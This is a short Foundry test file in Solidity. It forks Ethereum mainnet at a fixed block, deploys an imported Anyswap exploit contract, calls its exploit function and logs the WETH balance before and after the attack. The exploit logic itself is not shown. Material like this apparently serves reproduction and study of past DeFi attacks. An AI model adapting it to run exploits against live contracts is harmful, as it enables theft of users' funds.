// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
import "forge-std/Test.sol";
import "../AnyswapExploit.sol";

contract ContractTest is Test{
    Exploit exp;
    WETH weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        vm.createSelectFork("mainnet", 14037236);
    }

    function testAnyswap() public {
        exp = new Exploit();
        console.log("WETH balance before attack: ", weth.balanceOf(address(exp)));
        exp.exploit();
        console.log("WETH balance after attack", weth.balanceOf(address(exp)));
    }
}